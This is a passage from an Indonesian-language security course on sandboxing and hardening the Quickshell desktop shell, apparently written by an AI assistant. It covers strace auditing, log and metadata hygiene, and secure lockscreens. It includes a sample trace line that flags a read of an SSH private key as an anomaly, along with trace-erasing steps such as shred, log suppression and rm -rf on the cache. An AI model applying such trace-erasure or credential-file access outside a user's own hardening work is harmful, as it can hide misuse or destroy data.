| **`DataDir`** | Direktori untuk data persisten (mis. database, konfigurasi yang dihasilkan). |
| **`StateDir`** | Direktori untuk state yang tidak kritis (mis. log, session state). |
| **`CacheDir`** | Direktori untuk cache yang dapat dihapus kapan saja. |

### 6.5 Visualisasi: Struktur Direktori dengan dan tanpa Pragma

```text
TANPA PRAGMA (default):
~/.local/share/quickshell/by-shell/<hash-path>/
~/.local/state/quickshell/by-shell/<hash-path>/
~/.cache/quickshell/by-shell/<hash-path>/

DENGAN PRAGMA:
~/.local/share/quickshell/my-secure-shell/data/
~/.local/state/quickshell/my-secure-shell/state/
~/.cache/quickshell/my-secure-shell/cache/

KEUNTUNGAN:
► Path dapat diprediksi (tidak bergantung pada hash).
► Mudah di-bind ke dalam sandbox.
► Mudah diaudit.
► Mudah dihapus/dibersihkan.
```

### 6.6 Hubungan dengan Modul Lain

- **Prasyarat:** Modul 1.1 (Penguncian Instance) — `ShellId` digunakan untuk penguncian instance.
- **Melanjutkan ke:** Bagian 5 (Sandbox seluruh shell) — Anda perlu mengetahui direktori mana yang harus di-bind.
- **Terkait:** Modul 4.3 (systemd hardening) — direktori state/cache dapat dilindungi dengan `ProtectHome` atau `ReadWritePaths`.

### 6.7 Sumber Referensi

- **Quickshell Singleton:** [https://quickshell.org/docs/types/Quickshell/Quickshell](https://quickshell.org/docs/types/Quickshell/Quickshell) — Dokumentasi properti `dataDir`, `stateDir`, `cacheDir`, `shellId`.
- **Quickshell ShellId Pragma:** [https://quickshell.org/docs/guide/configuration](https://quickshell.org/docs/guide/configuration) — Panduan konfigurasi (termasuk pragma).

### 6.8 Tips dan Praktik Terbaik

- **Selalu tetapkan `ShellId` secara eksplisit.** Jangan mengandalkan hash path (yang dapat berubah jika path berubah).
- **Gunakan path yang deskriptif.** `my-secure-shell` lebih baik daripada `shell1`.
- **Pisahkan direktori untuk shell yang berbeda.** Jangan pernah berbagi `DataDir` antara shell utama dan shell eksperimental.
- **Bind direktori state sebagai read-write hanya jika perlu.** Jika shell tidak perlu menulis state, bind sebagai read-only.

### 6.9 Potensi Kesalahan Umum & Solusi

| Kesalahan | Solusi |
|---|---|
| Tidak menetapkan `ShellId`, sehingga direktori default bergantung pada hash path yang berubah jika konfigurasi dipindahkan. | Selalu tetapkan `ShellId` secara eksplisit. |
| Menimpa `DataDir` ke path yang tidak dapat diakses oleh pengguna. | Pastikan path dapat ditulis oleh pengguna. |
| Menggunakan `$HOME` alih-alih `$BASE` dalam pragma. | Pragma menggunakan `$BASE` (yang merujuk ke `$XDG_DATA_HOME`, dll.), bukan `$HOME`. Gunakan `$BASE` dengan benar. |

---

## 7. Audit Akses dengan `strace`

### 7.1 Deskripsi Konkret & Peran dalam Kurikulum

`strace` adalah alat **diagnostik** yang merekam **syscall** (system call)—permintaan program kepada kernel. Dalam konteks keamanan, `strace` digunakan untuk:

1.  **Audit:** Melihat file, socket, dan sumber daya apa yang diakses oleh Quickshell.
2.  **Debugging sandbox:** Menemukan bind yang hilang saat menjalankan shell di dalam `bwrap`.
3.  **Deteksi anomali:** Melihat apakah Quickshell mengakses file yang tidak seharusnya (mis. `~/.ssh`).

Modul ini melengkapi Bagian 5: Anda tidak bisa hanya menebak bind yang diperlukan; Anda perlu **mengukur** akses aktual.

### 7.2 Konsep Kunci & Filosofi Mendalam

**Analogi:** `strace` adalah **kamera pengawas** untuk syscall. Anda tidak mengubah perilaku program; Anda hanya **merekam** apa yang dilakukannya. Ini adalah alat observasi, bukan alat pencegahan.

**Filosofi inti:** **Anda tidak bisa mengamankan apa yang tidak Anda ukur.** Sebelum Anda bisa memutuskan file mana yang harus di-bind ke dalam sandbox, Anda perlu tahu file mana yang **benar-benar** diakses oleh Quickshell.

**Syscall yang relevan untuk audit keamanan:**

| Syscall | Fungsi | Mengapa Penting |
|---|---|---|
| `openat` | Membuka file | Melihat file apa yang dibaca/ditulis. |
| `stat` / `lstat` | Mendapatkan metadata file | Melihat file apa yang diperiksa. |
| `access` | Memeriksa izin akses | Melihat file apa yang dicek izinnya. |
| `connect` | Menghubungkan ke socket | Melihat koneksi jaringan/D-Bus. |
| `execve` | Mengeksekusi program | Melihat program apa yang dijalankan. |
| `unlink` / `rename` | Menghapus/memindahkan file | Melihat file apa yang dimodifikasi. |

### 7.3 Sintaks Dasar / Contoh Implementasi Inti

```bash
# Rekam semua syscall file yang dilakukan Quickshell dan proses anaknya
strace -f -e trace=file -o /tmp/qs.trace quickshell -c my-shell

# Rekam syscall jaringan juga
strace -f -e trace=network -o /tmp/qs-net.trace quickshell -c my-shell

# Rekam semua syscall (verbose, tetapi berguna untuk audit menyeluruh)
strace -f -o /tmp/qs-all.trace quickshell -c my-shell
```

**Penjelasan kata demi kata:**
- `strace`: Nama program.
- `-f`: **Follow forks**—mengikuti proses anak yang dibuat oleh Quickshell. Tanpa ini, Anda hanya merekam proses utama.
- `-e trace=file`: Hanya merekam syscall yang berkaitan dengan file. Ini mengurangi noise.
- `-o /tmp/qs.trace`: Menyimpan output ke file (bukan ke stderr).
- `quickshell -c my-shell`: Perintah yang dijalankan.

**Menganalisis hasil:**

```bash
# Lihat semua file yang gagal dibuka (ENOENT) atau ditolak (EACCES)
grep -E 'ENOENT|EACCES' /tmp/qs.trace | head -30

# Lihat semua koneksi socket (termasuk D-Bus dan Wayland)
grep 'connect(' /tmp/qs.trace | head -20

# Lihat semua program yang dieksekusi
grep 'execve(' /tmp/qs.trace
```

**Contoh output dan interpretasi:**

```text
openat(AT_FDCWD, "/home/user/.config/quickshell/my-shell/shell.qml", O_RDONLY) = 3
openat(AT_FDCWD, "/home/user/.ssh/id_rsa", O_RDONLY) = -1 ENOENT (No such file or directory)
connect(4, {sa_family=AF_UNIX, sun_path="/run/user/1000/wayland-1"}, 110) = 0
connect(4, {sa_family=AF_UNIX, sun_path="/run/user/1000/bus"}, 110) = 0
```

**Interpretasi:**
- Baris 1: Quickshell membuka konfigurasi → **normal**, perlu di-bind.
- Baris 2: Quickshell mencoba membuka `~/.ssh/id_rsa` tetapi gagal (ENOENT) karena file tidak ada. **Jika file itu ada**, ini adalah **anomali** yang perlu diselidiki. Mengapa Quickshell mencoba mengakses kunci SSH?
- Baris 3: Quickshell terhubung ke Wayland socket → **normal**, perlu di-bind.
- Baris 4: Quickshell terhubung ke D-Bus sesi → **normal**, tetapi perlu **disaring** (lihat Modul 4.3).

### 7.4 Terminologi Esensial

| Istilah | Definisi |
|---|---|
| **Syscall** | Antarmuka antara program pengguna dan kernel. |
| **`strace`** | Alat untuk merekam syscall. |
| **`ENOENT`** | Error "No such file or directory." |
| **`EACCES`** | Error "Permission denied." |
| **`execve`** | Syscall untuk mengeksekusi program. |

### 7.5 Visualisasi: Alur Audit `strace`

```text
[Quickshell]
     │
     │  syscall: openat("/home/user/.config/.../shell.qml")
     ▼
[Kernel] ──► [strace merekam] ──► /tmp/qs.trace
     │
     │  syscall: connect("/run/user/1000/bus")
     ▼
[Kernel] ──► [strace merekam] ──► /tmp/qs.trace
     │
     ▼
[Analisis: grep ENOENT/EACCES]
     │
     ▼
[Keputusan: bind mana yang perlu ditambahkan?]
```

### 7.6 Hubungan dengan Modul Lain

- **Prasyarat:** Bagian 5 (Sandbox seluruh shell) — `strace` digunakan untuk menemukan bind yang hilang.
- **Melanjutkan ke:** Bagian 8 (Log dan metadata) — `strace` juga dapat digunakan untuk melihat file log apa yang ditulis.
- **Terkait:** Modul 4.3 (systemd hardening) — `systemd-analyze security` memberikan gambaran yang lebih terstruktur tentang hardening.

### 7.7 Sumber Referensi

- **`strace(1)` man page:** [https://man7.org/linux/man-pages/man1/strace.1.html](https://man7.org/linux/man-pages/man1/strace.1.html) — Referensi lengkap.
- **Arch Wiki: strace:** [https://wiki.archlinux.org/title/Strace](https://wiki.archlinux.org/title/Strace) — Panduan praktis.
- **Brendan Gregg: strace** [https://www.brendangregg.com/](https://www.brendangregg.com/) — Sumber daya tracing dan performance.

### 7.8 Tips dan Praktik Terbaik

- **Gunakan `-e trace=file` untuk audit file**, `-e trace=network` untuk audit jaringan. Jangan merekam semua syscall kecuali perlu (outputnya sangat besar).
- **Gunakan `-f` selalu** untuk Quickshell, karena ia membuat banyak proses anak.
- **Bandingkan output dengan dan tanpa sandbox.** Ini menunjukkan dampak sandbox.
- **Filter dengan `grep` untuk fokus pada error.** `ENOENT` dan `EACCES` adalah sinyal utama.
- **Hati-hati dengan data sensitif di trace.** `strace` dapat merekam isi file yang dibaca (jika menggunakan `-e read`). Jangan bagikan trace yang mengandung kredensial.

### 7.9 Potensi Kesalahan Umum & Solusi

| Kesalahan | Solusi |
|---|---|
| Lupa `-f` sehingga hanya proses utama yang direkam. | Selalu gunakan `-f` untuk Quickshell. |
| Merekam semua syscall sehingga outputnya terlalu besar untuk dianalisis. | Gunakan `-e trace=file` atau `-e trace=network` untuk fokus. |
| Menganggap `ENOENT` selalu error. | `ENOENT` seringkali **normal**—program mencari file di beberapa lokasi, dan tidak menemukannya di salah satunya. Fokus pada `EACCES` (izin ditolak) dan `ENOENT` untuk file yang **seharusnya** ada. |
| Tidak menghapus trace setelah selesai (mengandung data sensitif). | Hapus trace dengan `shred -u` atau setidaknya `rm` setelah analisis. |

---

## 8. [TAMBAHAN] Kebersihan Log dan Metadata (Anonimitas)

### 8.1 Deskripsi Konkret & Peran dalam Kurikulum

Bagian ini **tidak ada** dalam kurikulum asli, tetapi penting untuk tujuan anonimitas yang disebutkan dalam deskripsi Fase 4. Setelah Anda mengamankan shell, pertanyaan berikutnya adalah: **jejak apa yang ditinggalkan shell?** Log, metadata file, dan catatan sistem dapat membocorkan informasi tentang aktivitas Anda—bahkan jika shell itu sendiri aman.

**[TAMBAHAN]** Bagian ini melengkapi Modul 4.1 dengan perspektif **opsec** (operational security): bukan hanya mencegah serangan, tetapi juga **meminimalkan jejak**.

### 8.2 Konsep Kunci & Filosofi Mendalam

**Filosofi inti:** **Anonimitas bukan tentang menghilang, melainkan tentang tidak meninggalkan jejak yang bisa dihubungkan kembali kepada Anda.** Setiap file yang dibuat, setiap log yang ditulis, setiap metadata yang tersimpan adalah **potensi kebocoran**.

**Sumber jejak yang relevan untuk Quickshell:**

| Sumber Jejak | Apa yang Tercatat | Risiko |
|---|---|---|
| **Log Quickshell** | Pesan error, path file, nama proses, output `console.log()` | Membocorkan struktur direktori, nama pengguna, aktivitas |
| **`journalctl --user`** | Log dari unit systemd user (jika Quickshell berjalan sebagai service) | Sama seperti di atas, ditambah metadata waktu |
| **File state/cache** | Data yang ditulis oleh shell (mis. cache cuaca, state widget) | Membocorkan preferensi, lokasi, aktivitas |
| **Metadata filesystem** | Waktu akses (atime), waktu modifikasi (mtime), pemilik file | Membocorkan kapan shell digunakan, oleh siapa |
| **D-Bus** | Nama unik, nama well-known, pesan | Membocorkan layanan yang digunakan shell |

### 8.3 Sintaks Dasar / Contoh Implementasi Inti: Meminimalkan Jejak

#### 1. Menonaktifkan atau Membatasi Log Quickshell

Quickshell menulis log ke stderr secara default. Jika Anda menjalankannya dari terminal, log terlihat di terminal. Jika Anda menjalankannya sebagai service, log masuk ke journal.

**Opsi 1: Jalankan dengan `QT_LOGGING_RULES` untuk mengurangi log**

```bash
# Nonaktifkan log debug (hanya tampilkan warning dan error)
QT_LOGGING_RULES="*.debug=false" quickshell -c my-shell
```

**Penjelasan:**
- `QT_LOGGING_RULES`: Variabel lingkungan Qt untuk mengontrol kategori logging.
- `*.debug=false`: Menonaktifkan semua log level debug.

**Opsi 2: Arahkan log ke `/dev/null` (jika tidak diperlukan)**

```bash
quickshell -c my-shell 2>/dev/null
```

**Penjelasan:**
- `2>/dev/null`: Mengalihkan stderr (file descriptor 2) ke `/dev/null` (dibuang).

**Peringatan:** Menonaktifkan log sepenuhnya membuat debugging menjadi sulit. Gunakan ini hanya di lingkungan produksi yang sudah stabil.

#### 2. Membersihkan Metadata File

Metadata file (atime, mtime, dll.) dapat membocorkan kapan file diakses/dimodifikasi.

```bash
# Lihat metadata file
stat ~/.local/state/quickshell/my-secure-shell/state/somefile

# Hapus file dan metadata-nya (timestamps) dengan aman
shred -u ~/.local/state/quickshell/my-secure-shell/state/somefile
```

**Penjelasan:**
- `stat`: Menampilkan metadata file (akses, modifikasi, perubahan).
- `shred -u`: Menimpa file dengan data acak sebelum menghapusnya, sehingga sulit dipulihkan. `-u` menghapus file setelah shredding.

**Untuk direktori cache:**

```bash
# Bersihkan cache secara berkala
rm -rf ~/.cache/quickshell/my-secure-shell/cache/*
```

#### 3. Menonaktifkan `atime` (Access Time)

Secara default, Linux memperbarui `atime` setiap kali file dibaca. Ini bisa membocorkan **kapan** file diakses. Anda dapat me-mount filesystem dengan `noatime` untuk menonaktifkan ini.

```bash
# Cek opsi mount saat ini
mount | grep " / "

# Tambahkan noatime ke /etc/fstab (hati-hati!)
# UUID=... / ext4 defaults,noatime 0 1
```

**Penjelasan:**
- `noatime`: Opsi mount yang menonaktifkan pembaruan `atime` saat file dibaca. Ini meningkatkan performa dan privasi.
- **Peringatan:** Ini adalah perubahan sistem-wide. Pahami implikasinya sebelum menerapkan.

#### 4. Menggunakan `systemd` untuk Membatasi Log

Jika Quickshell berjalan sebagai service systemd user, Anda dapat membatasi log dengan `LogLevelMax`:

```ini
# ~/.config/systemd/user/quickshell.service
[Service]
ExecStart=/usr/bin/quickshell -c my-shell
LogLevelMax=warning
```

**Penjelasan:**
- `LogLevelMax=warning`: Hanya log level warning dan error yang dicatat ke journal. Log debug dan info diabaikan.

### 8.4 Terminologi Esensial

| Istilah | Definisi |
|---|---|
| **Opsec (Operational Security)** | Proses mengidentifikasi dan melindungi informasi yang sensitif dari adversary. |
| **Metadata** | Data tentang data (mis. timestamp, pemilik file, ukuran). |
| **`atime`** | Waktu terakhir file diakses. |
| **`mtime`** | Waktu terakhir file dimodifikasi. |
| **`shred`** | Alat untuk menimpa file sebelum menghapusnya, sehingga sulit dipulihkan. |
| **`journalctl`** | Alat untuk melihat log systemd journal. |

### 8.5 Visualisasi: Sumber Jejak dan Mitigasi

```text
┌────────────────────────────────────────────────────────────────────┐
│                        SUMBER JEJAK                                │
│                                                                    │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────────┐  │
│  │Log Quickshell│  │ File state/  │  │ Metadata filesystem      │  │
│  │(stderr,      │  │ cache        │  │ (atime, mtime, owner)    │  │
│  │ journal)     │  │              │  │                          │  │
│  └──────┬───────┘  └──────┬───────┘  └────────────┬─────────────┘  │
└─────────┼─────────────────┼───────────────────────┼────────────────┘
          │                 │                       │
          ▼                 ▼                       ▼
┌─────────────────────────────────────────────────────────────────────┐
│                        MITIGASI                                     │
│                                                                     │
│  QT_LOGGING_RULES   shred -u              mount -o noatime          │
│  2>/dev/null        rm -rf cache/*        (hati-hati!)              │
│  LogLevelMax        umask 077                                       │
└─────────────────────────────────────────────────────────────────────┘
```

### 8.6 Hubungan dengan Modul Lain

- **Prasyarat:** Bagian 7 (`strace`) — Anda sudah bisa melihat file apa yang diakses/ditulis.
- **Melanjutkan ke:** Modul 4.3 (systemd hardening) — `LogLevelMax` dan `umask` adalah bagian dari hardening.
- **Terkait:** Seluruh Fase 4 — anonimitas adalah lapisan tambahan di atas keamanan.

### 8.7 Sumber Referensi

- **Arch Wiki: Improving Performance (noatime):** [https://wiki.archlinux.org/title/Improving_performance#Mount_options](https://wiki.archlinux.org/title/Improving_performance#Mount_options)
- **`systemd.exec` man page (LogLevelMax):** [https://www.freedesktop.org/software/systemd/man/systemd.exec.html](https://www.freedesktop.org/software/systemd/man/systemd.exec.html)
- **`shred(1)` man page:** [https://man7.org/linux/man-pages/man1/shred.1.html](https://man7.org/linux/man-pages/man1/shred.1.html)

### 8.8 Tips dan Praktik Terbaik

- **Jangan menonaktifkan log sepenuhnya kecuali Anda yakin.** Log adalah alat debugging yang penting.
- **Gunakan `umask 077`** untuk memastikan file yang dibuat shell tidak dapat dibaca pengguna lain. Ini dapat diatur di unit systemd atau di shell startup.
- **Bersihkan cache secara berkala.** Cache yang menumpuk dapat membocorkan pola penggunaan.
- **Pertimbangkan enkripsi direktori state.** Jika state mengandung informasi sensitif, gunakan `gocryptfs` atau `fscrypt`.

### 8.9 Potensi Kesalahan Umum & Solusi

| Kesalahan | Solusi |
|---|---|
| Mengira menghapus file dengan `rm` sudah cukup. | `rm` hanya menghapus pointer; data masih bisa dipulihkan. Gunakan `shred -u` untuk file sensitif. |
| Menonaktifkan `atime` tanpa memahami implikasinya. | `noatime` dapat memengaruhi aplikasi yang mengandalkan `atime` (mis. mail client). Uji terlebih dahulu. |
| Tidak membersihkan cache, sehingga menumpuk dan membocorkan pola. | Jadwalkan pembersihan berkala (mis. dengan `systemd-tmpfiles` atau cron). |

---

## 9. Latihan, Checkpoint, dan Visualisasi Akhir

### 9.1 Latihan dan Checkpoint (Sesuai Kurikulum Asli)

**Latihan:**
1.  Tulis threat model satu halaman untuk shell Anda (gunakan template di Bagian 1.3).
2.  Sandbox satu `Process` pembantu dengan `bwrap`. Buktikan bahwa ia:
    - Tidak bisa membaca `~` (coba `cat ~/.bashrc` di dalam sandbox).
    - Tidak bisa menjangkau jaringan (coba `curl https://example.com` di dalam sandbox).

**Checkpoint:**
- Jelaskan mengapa mengikat socket D-Bus sesi **mentah** membuka jalan keluar dari sandbox. **Jawaban singkat:** Bus sesi tidak memiliki kebijakan akses seperti bus sistem. Proses di dalam sandbox dapat meminta layanan lain (mis. `systemd --user`) untuk menjalankan program di **luar** sandbox. `xdg-dbus-proxy` menyaring pesan sehingga hanya layanan yang diizinkan yang dapat diakses.

### 9.2 Visualisasi Akhir: Peta Lengkap Modul 4.1

```text
┌────────────────────────────────────────────────────────────────────┐
│                    MODUL 4.1 — PETA KONSEP                         │
│                                                                    │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │  1. THREAT MODEL                                             │  │
│  │     Aset → Pelaku → Batas Kepercayaan → Mitigasi             │  │
│  └─────────────────────────┬────────────────────────────────────┘  │
│                            │                                       │
│                            ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │  2. QML = KODE BERHAK PENUH                                  │  │
│  │     Process, FileView, IpcHandler → Risiko                   │  │
│  └─────────────────────────┬────────────────────────────────────┘  │
│                            │                                       │
│                            ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │  3. NAMESPACE LINUX                                          │  │
│  │     mnt, pid, net, ipc, uts, user → Fondasi isolasi          │  │
│  └─────────────────────────┬────────────────────────────────────┘  │
│                            │                                       │
│                            ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │  4. BWRAP (HELPER)                                           │  │
│  │     --ro-bind, --unshare-all, --die-with-parent              │  │
│  │     Contoh: cat /proc/loadavg di sandbox minimal             │  │
│  └─────────────────────────┬────────────────────────────────────┘  │
│                            │                                       │
│                            ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │  5. BWRAP (SELURUH SHELL) — HARD MODE                        │  │
│  │     Bind Wayland socket, /dev/dri, konfigurasi               │  │
│  │     Jebakan: proses anak mewarisi sandbox                    │  │
│  │     Solusi: systemd-run --user, compositor                   │  │
│  └─────────────────────────┬────────────────────────────────────┘  │
│                            │                                       │
│                            ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │  6. PRAGMA QUICKSHELL                                        │  │
│  │     ShellId, DataDir, StateDir, CacheDir                     │  │
│  │     → Pemisahan direktori, prediktabilitas                   │  │
│  └─────────────────────────┬────────────────────────────────────┘  │
│                            │                                       │
│                            ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │  7. AUDIT STRACE                                             │  │
│  │     strace -f -e trace=file → ENOENT/EACCES                  │  │
│  │     → Temukan bind yang hilang                               │  │
│  └─────────────────────────┬────────────────────────────────────┘  │
│                            │                                       │
│                            ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │  8. [TAMBAHAN] KEBERSIHAN LOG & METADATA                     │  │
│  │     QT_LOGGING_RULES, shred, noatime, umask 077              │  │
│  │     → Anonimitas                                             │  │
│  └──────────────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────────────┘
```

---

## 🎯 Motivasi

> *"Keamanan bukan tentang ketakutan, melainkan tentang kebebasan: kebebasan untuk menjalankan shell Anda tanpa rasa khawatir, kebebasan untuk bereksperimen tanpa risiko kehilangan kendali. Setiap lapisan sandbox yang Anda bangun adalah fondasi untuk eksplorasi yang lebih berani."*

---

## ✅ Konfirmasi untuk Melanjutkan

Modul 4.1 telah selesai dibahas secara komprehensif, mencakup:
- Threat model (dengan template siap pakai)
- Sifat QML sebagai kode berbahaya
- Namespace Linux (fondasi isolasi)
- Bubblewrap untuk helper (3 contoh konfigurasi)
- Bubblewrap untuk seluruh shell (hard mode + jebakan pewarisan)
- Pragma Quickshell (ShellId, DataDir, dll.)
- Audit `strace`
- **[TAMBAHAN]** Kebersihan log dan metadata

**Silakan konfirmasi jika Anda ingin saya melanjutkan ke Modul 4.2 — Lockscreen: `WlSessionLock` dan PAM.** Saya akan membahasnya dengan kedalaman yang sama, termasuk **[TAMBAHAN]** prosedur pemulihan lupa kata sandi dan PAM lockout.

---

Kita akan melanjutkan ke **Modul 4.2**. Saya akan membahasnya dengan kedalaman yang sama seperti Modul 4.1, termasuk **[TAMBAHAN]** yang tidak ada di kurikulum asli: prosedur pemulihan lupa kata sandi, penanganan `pam_faillock` lockout, dan skenario `allow_session_lock_restore` di Hyprland.

---

# MODUL 4.2 — Lockscreen: `WlSessionLock` dan PAM

## 📋 Daftar Isi Modul 4.2

1.  Deskripsi Konkret & Peran dalam Kurikulum
2.  Konsep Kunci & Filosofi: Mengapa Lockscreen Harus Fail-Safe
3.  `ext-session-lock-v1`: Protokol Wayland di Balik Layar
4.  `WlSessionLock` dan `WlSessionLockSurface`: Anatomi Lengkap
5.  `PamContext`: Siklus Autentikasi Langkah demi Langkah
6.  Konfigurasi PAM Khusus Lockscreen: `/etc/pam.d/quickshell-lock`
7.  Penanganan Kredensial: Umur di Memori, Pembersihan, dan Anti-Log
8.  Prosedur Pemulihan dan Pengujian di VM **[TAMBAHAN]**
9.  Audit Keamanan Lockscreen
10. Terminologi Esensial
11. Visualisasi: Alur Lockscreen dan Fail-Safe
12. Hubungan dengan Modul Lain
13. Sumber Referensi
14. Tips dan Praktik Terbaik
15. Potensi Kesalahan Umum & Solusi
16. Latihan dan Checkpoint

---

## 1. Deskripsi Konkret & Peran dalam Kurikulum

Modul ini membangun **lockscreen yang benar-benar aman** menggunakan dua komponen:

- **`WlSessionLock`** — implementasi Quickshell dari protokol Wayland `ext-session-lock-v1`.
- **`PamContext`** — koneksi Quickshell ke **PAM** (Pluggable Authentication Modules) untuk memverifikasi kata sandi.

**Mengapa ini kritis?** Lockscreen adalah **garis pertahanan terakhir** antara penyerang fisik dan sesi Anda yang sedang berjalan. Jika lockscreen gagal dengan cara yang salah (mis. crash dan meninggalkan desktop terbuka), seluruh sesi Anda terekspos. Jika lockscreen "aman" tetapi **membocorkan kata sandi** (mis. menyimpannya di memori terlalu lama atau mencatatnya ke log), keamanan fisik menjadi sia-sia.

**Peran dalam kurikulum:** Modul 4.1 mengajarkan Anda **mengisolasi proses** dan **memahami ancaman**. Modul 4.2 mengajarkan Anda **mengamankan komponen paling sensitif** yang berinteraksi langsung dengan kredensial. Modul 4.3 nanti akan melengkapi dengan **greetd** (login manager) dan **penyaringan D-Bus**—yang merupakan "pintu depan" dan "operator telepon" bagi sesi Anda.

---

## 2. Konsep Kunci & Filosofi: Mengapa Lockscreen Harus Fail-Safe

### 2.1 Analogi

Bayangkan sebuah pintu darurat di gedung bertingkat. Jika alarm kebakaran gagal berbunyi, pintu **tetap terkunci**—bukan terbuka lebar. Kegagalan sistem **tidak boleh** membuat pintu menjadi tidak aman. Itulah **fail-safe**: ketika komponen gagal, sistem tetap dalam keadaan **aman** (dalam hal ini, tetap terkunci).

Lockscreen yang aman bekerja dengan prinsip yang sama: **jika compositor atau klien pengunci mati, sesi tetap terkunci**—bahkan jika itu berarti layar menjadi "beku" dan tidak bisa dibuka sampai Anda melakukan intervensi manual.

### 2.2 Mengapa `WlrKeyboardFocus.Exclusive` Bukan Pengganti

`WlrKeyboardFocus.Exclusive` adalah fitur yang memfokuskan keyboard secara eksklusif ke suatu permukaan. Ini **terlihat** seperti lockscreen, tetapi **bukan** mekanisme keamanan:

| Aspek | `WlrKeyboardFocus.Exclusive` | `ext-session-lock-v1` |
|---|---|---|
| Menyembunyikan jendela lain | **Tidak** — jendela lain tetap terlihat di belakang | **Ya** — compositor menahan tampilan klien lain |
| Fail-safe jika klien mati | **Tidak** — fokus hilang, desktop kembali terlihat | **Ya** — sesi tetap terkunci |
| Ditegakkan oleh compositor | **Tidak** — hanya sinyal fokus | **Ya** — compositor yang mengunci sesi |
| Dapat dilewati dengan keybind | **Ya** (tergantung compositor) | **Tidak** — input ditahan |

**Kesimpulan:** `WlrKeyboardFocus.Exclusive` hanya berguna untuk **fokus input** (mis. saat bermain game atau mengetik di terminal), bukan untuk **keamanan sesi**. Lockscreen yang benar-benar aman **harus** menggunakan `ext-session-lock-v1`.

### 2.3 Filosofi: Compositor sebagai Penjaga Gedung

Pada protokol `ext-session-lock-v1`, **compositor** (Hyprland, Sway, dll.) yang mengunci sesi—bukan klien. Klien (Quickshell) hanya **meminta** agar sesi dikunci dan **memberi tahu** kapan harus dibuka. Jika klien mati, compositor **tetap menahan** sesi dalam keadaan terkunci. Inilah yang membuatnya **fail-safe**.

---

## 3. `ext-session-lock-v1`: Protokol Wayland di Balik Layar

### 3.1 Cara Kerja Protokol

Protokol `ext-session-lock-v1` mendefinisikan dua objek utama:

1.  **`ext_session_lock_manager_v1`** — antarmuka untuk **meminta** kunci sesi.
2.  **`ext_session_lock_v1`** — objek yang mewakili **sesi yang terkunci**.

Alurnya:

```text
Klien (Quickshell)                    Compositor
      │                                    │
      │  create ext_session_lock_v1        │
      │───────────────────────────────────►│
      │                                    │
      │◄───────────────────────────────────│
      │  event: locked (atau finished)     │
      │                                    │
      │  create lock surface per screen    │
      │───────────────────────────────────►│
      │                                    │
      │  [compositor menahan input &       │
      │   tampilan klien lain]             │
      │                                    │
      │  unlock_and_destroy (jika sukses)  │
      │───────────────────────────────────►│
      │                                    │
      │◄───────────────────────────────────│
      │  [sesi terbuka]                    │
```

**Poin penting dari spesifikasi:**

- Klien bertanggung jawab melakukan autentikasi dan memberi tahu compositor kapan sesi harus dibuka.
- **Jika klien mati saat sesi terkunci, sesi tetap terkunci**—bahkan mungkin secara permanen, tergantung kebijakan compositor.
- Compositor **dapat** mengizinkan klien baru untuk mengambil alih sesi terkunci (mis. setelah crash), tetapi ini adalah **kebijakan compositor**, bukan jaminan.

### 3.2 Perilaku Fail-Safe di Quickshell

Dokumentasi Quickshell menegaskan:

> "If the `WlSessionLock` is destroyed or quickshell exits without setting `locked` to false, conformant compositors will leave the screen locked and painted with a solid color. This is what makes the session lock secure. The lock dying will not expose your session, but it will render it inoperable."

**Terjemahan dan penjelasan:**
- Jika `WlSessionLock` dihancurkan atau Quickshell keluar **tanpa** menyetel `locked = false`, compositor yang patuh akan **tetap mengunci** layar dan menampilkannya dengan **warna solid** (biasanya hitam atau merah).
- **Ini adalah fitur, bukan bug.** Layar yang "beku" berarti sesi Anda **tidak terekspos**. Anda mungkin perlu melakukan intervensi manual (mis. dari TTY) untuk memulihkannya—dan itu adalah **harga yang pantas** untuk keamanan.

---

## 4. `WlSessionLock` dan `WlSessionLockSurface`: Anatomi Lengkap

### 4.1 `WlSessionLock`: Properti dan Perilaku

Berdasarkan dokumentasi resmi:

| Properti | Tipe | Deskripsi |
|---|---|---|
| **`surface`** | `Component` (default) | Komponen yang akan dibuat **untuk setiap layar** saat `locked = true`. Komponen ini **harus** membuat `WlSessionLockSurface`. |
| **`locked`** | `bool` | Mengontrol status kunci. **Peringatan:** Hanya **satu** `WlSessionLock` yang boleh terkunci pada satu waktu. Mencoba mengaktifkan kunci saat kunci lain aktif **tidak akan melakukan apa-apa**. |
| **`secure`** | `bool` (readonly) | Status kunci dari compositor. Menjadi `true` setelah compositor mengonfirmasi **semua layar tertutup** oleh lockscreen. |

**Mengapa `secure` penting?** Anda tidak boleh menganggap sesi "terkunci" hanya karena `locked = true`. `locked = true` hanyalah **permintaan** Anda. Sesi benar-benar aman hanya ketika `secure = true`—yaitu setelah compositor mengonfirmasi bahwa **semua layar** telah tertutup. Jika ada layar yang belum tertutup (mis. monitor eksternal yang baru dicolokkan), `secure` akan tetap `false`.

**Peringatan "hanya satu lock":** Jika Anda memiliki dua shell Quickshell yang berjalan (mis. shell utama dan shell eksperimental), dan keduanya mencoba mengunci sesi, **hanya yang pertama** yang berhasil. Yang kedua akan diabaikan. Ini mencegah konflik, tetapi juga berarti Anda harus **mematikan** shell lain sebelum mengunci.

### 4.2 `WlSessionLockSurface`: Permukaan per Layar

Setiap `WlSessionLock` membuat **satu** `WlSessionLockSurface` **per layar** (multi-monitor). Properti penting:

| Properti | Tipe | Deskripsi |
|---|---|---|
| **`screen`** | `ShellScreen` (readonly) | Layar tempat permukaan ini ditampilkan. Berguna untuk menyesuaikan konten per monitor. |
| **`visible`** | `bool` (readonly) | Apakah permukaan telah dibuat terlihat. **Catatan:** `SessionLockSurface` **tidak akan pernah** menjadi tidak terlihat; ia hanya akan **dihancurkan**. Ini berarti Anda tidak perlu khawatir tentang transisi "terlihat → tidak terlihat"; permukaan hidup sampai lockscreen berakhir. |
